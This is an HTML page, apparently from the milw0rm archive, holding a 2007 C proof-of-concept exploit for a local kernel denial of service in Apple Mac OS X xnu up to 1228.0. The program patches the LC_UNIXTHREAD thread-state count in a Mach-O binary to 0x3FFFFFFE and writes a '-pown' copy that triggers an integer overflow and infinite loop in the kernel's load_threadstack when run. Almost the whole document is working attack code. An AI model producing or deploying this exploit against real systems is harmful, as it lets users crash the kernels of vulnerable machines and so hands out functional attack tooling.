<html><head><title>Apple Mac OS X xnu &lt;= 1228.0 Local Kernel Denial of Service PoC</title></head><body><pre>/* xnu-macho-dos.c
 *
 * Copyright (c) 2007 by &lt;mu-b@digit-labs.org&gt;
 *
 * Apple MACOS X xnu &lt;= 1228.0 local kernel DoS POC
 * by mu-b - Thu 15 Nov 2007
 *
 * - Tested on: Apple MACOS X 10.4 (xnu-792.22.5~1/RELEASE_I386)
 *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_PPC)
 *
 * integer overflow causes infinite loop in load_threadstack.
 *                                    (bsd/kern/mach_loader.c)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

#define MAX_PATH_LEN        128

#define LC_UNIXTHREAD       0x05
#define x86_THREAD_STATE32  0x01

/* osfmk/mach-o/loader.h */
struct thread_command {
  unsigned long cmd;            /* LC_THREAD or LC_UNIXTHREAD */
  unsigned long cmdsize;        /* total size of this command */
  unsigned long flavor;         /* flavor of thread state */
  unsigned long count;          /* count of longs in thread state */
};

static void *
xmalloc (int num_bytes)
{
  char *buf;

  buf = malloc (num_bytes);
  if (buf == NULL)
    {
      fprintf (stderr, "malloc (): out of memory allocating %d-bytes!\n", num_bytes);
      exit (EXIT_FAILURE);
    }

  return (buf);
}

int
main (int argc, char ** argv)
{
  char fnbuf[MAX_PATH_LEN], *ptr, *cur, *end;
  int fd, wfd, found, size;
  struct stat fbuf;

  printf ("Apple MACOS X xnu &lt;= 1228.0 local kernel DoS PoC\n"
          "by: &lt;mu-b@digit-labs.org&gt;\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc &lt;= 1)
    {
      fprintf (stderr, "Usage: %s &lt;macho-o binary&gt;\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if ((fd = open (argv[1], O_RDONLY)) == -1)
    {
      perror ("open ()");
      exit (EXIT_FAILURE);
    }

  snprintf (fnbuf, sizeof fnbuf, "%s-pown", argv[1]);

  if ((wfd = open (fnbuf, O_RDWR | O_CREAT)) == -1)
    {
      perror ("open ()");
      exit (EXIT_FAILURE);
    }

  if (fstat (fd, &amp;fbuf) &lt; 0)
    {
      perror ("fstat ()");
      exit (EXIT_FAILURE);
    }

  size = fbuf.st_size;
  ptr = xmalloc (sizeof (char) * size);
  end = ptr + size;

  if (read (fd, ptr, size) &lt; size)
    {
      unlink (fnbuf);

      perror ("write ()");
      exit (EXIT_FAILURE);
    }

  close (fd);

  for (cur = ptr, found = 0;
       !found &amp;&amp; cur + sizeof (struct thread_command) &lt; end;
       cur += sizeof (unsigned long))
    {
      struct thread_command *thr_cmd;

      thr_cmd = (struct thread_command *) cur;
      if (thr_cmd-&gt;cmd == LC_UNIXTHREAD &amp;&amp;
          thr_cmd-&gt;flavor == x86_THREAD_STATE32)
        {
          thr_cmd-&gt;count = 0x3FFFFFFE;
          printf ("* found at offset @0x%08X\n", cur - ptr);
          found = 1;
        }
    }

  if (!found)
    {
      unlink (fnbuf);

      fprintf (stderr, "* ARGH! hueristic didn't find our target!\n");
      exit (EXIT_FAILURE);
    }

  write (wfd, ptr, size);
  fchmod(wfd, fbuf.st_mode);
  close (wfd);

  free (ptr);
  fprintf (stdout, "* done\nexecute ./%s at your own risk!$%%!\n", fnbuf);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-12-04]</pre></body></html>